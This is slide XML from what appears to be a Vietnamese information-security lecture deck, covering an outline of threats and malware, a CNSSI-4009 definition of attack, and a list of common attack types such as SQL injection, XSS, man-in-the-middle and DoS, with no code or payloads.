              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
              <a:defRPr sz="2000" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="857250" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1200150" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1543050" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Arial"/>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pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ngăn ngừa Worm chủ động (Proactive worm containment)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A98351CE-CF16-41C6-9F06-1AEC69595DD0}"/>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l="7159" t="2316" r="7159" b="18529"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3048001" y="2066076"/>
            <a:ext cx="6324599" cy="4514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5532993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5" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>NỘI DUNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114691" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1219200" y="1828800"/>
            <a:ext cx="10515600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>I. TỔNG QUAN NGUY CƠ GÂY MẤT AN TOÀN THÔNG TIN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IV. MỘT SỐ KIỂU TẤN CÔNG PHỔ BIẾN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3081994507"/>
      </p:ext>
    </p:extLst>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a:t>IV. NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3600"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t> TẤN CÔNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Tấn công (Attack):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>Là</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>bất kỳ loại hoạt động độc hại nào cố gắng thu thập, làm gián đoạn, từ chối, làm suy thoái, hoặc hủy hoại tài nguyên hệ thống thông tin hoặc chính thông tin.” (CNSSI-4009)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="327330021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IV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t>. NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3600"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t> TẤN CÔNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5D7C633B-22B9-48B8-89D8-7F229F33DCFA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1752600"/>
            <a:ext cx="10515600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Nguy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tấn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thám</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Nguy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tấn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SQL Injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Nguy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tấn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Nguy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tấn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Man In The Middle</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Nguy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tấn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>từ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dịch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>DoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, DDoS, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>DRDoS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="268699061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IV. NGUY CƠ TẤN CÔNG</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Diagram 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8017B58B-5B22-4411-B43E-DEC45FD3F777}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1434396782"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1371600"/>
          <a:ext cx="10860157" cy="47275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20486490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3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just" eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13317"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990" t="22788" b="-1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1371601" y="1523389"/>
            <a:ext cx="9248986" cy="49536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itle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0DBFB00D-B9BB-4CC3-83EB-A6A94CAD1F49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>IV. NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> TẤN CÔNG</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3200"/>
              <a:t>1. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3200"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200"/>
              <a:t> tấn công do thám</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="136924685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1D8F2A9-66CA-441A-8952-43EDA0762D1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1295400" y="152400"/>
            <a:ext cx="10515600" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>IV. NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> TẤN CÔNG</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3200"/>
              <a:t>1. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3200"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200"/>
              <a:t> tấn công do thám</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15365"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t="13261"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2057400" y="1676400"/>
            <a:ext cx="8229600" cy="4399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7265290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9"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13513"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2455986" y="1652081"/>
            <a:ext cx="7450015" cy="42651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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3CFA141C-8925-461B-ACD2-7E217137CC94}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1295400" y="323470"/>
            <a:ext cx="10515600" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>IV. NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> TẤN CÔNG</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3200"/>
              <a:t>1. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3200"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200"/>
              <a:t> tấn công do thám</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="300007959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3"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12632"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2133600" y="1524000"/>
            <a:ext cx="7675728" cy="45985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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7DF38888-B377-4BF7-AEA7-E2C17DB3BFCA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="231965"/>
            <a:ext cx="10515600" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>IV. NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> TẤN CÔNG</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3200"/>
              <a:t>1. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3200"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200"/>
              <a:t> tấn công do thám</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="300346379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7"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13048"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2404293" y="1524000"/>
            <a:ext cx="7385002" cy="45411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itle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{173FA215-16E3-4B29-B169-D370C9BBC8B2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>IV. NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> TẤN CÔNG</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3200"/>
              <a:t>1. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3200"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200"/>
              <a:t> tấn công do thám</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="311743855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61"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13567"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1342563" y="1600199"/>
            <a:ext cx="8639637" cy="4779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itle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AF503827-80B5-4B5E-86E4-C38975BC61B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>IV. NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> TẤN CÔNG</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3200"/>
              <a:t>1. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3200"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200"/>
              <a:t> tấn công do thám</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{25223EBC-F0A1-42B2-8E88-1ADB5E997B30}"/>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48151473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IV. NGUY CƠ TẤN CÔNG</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Diagram 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8017B58B-5B22-4411-B43E-DEC45FD3F777}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2718172084"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1371600"/>
          <a:ext cx="10860157" cy="47275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5894778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31235" y="350189"/>
            <a:ext cx="10363200" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Nội dung chính</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="6" name="Content Placeholder 5"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
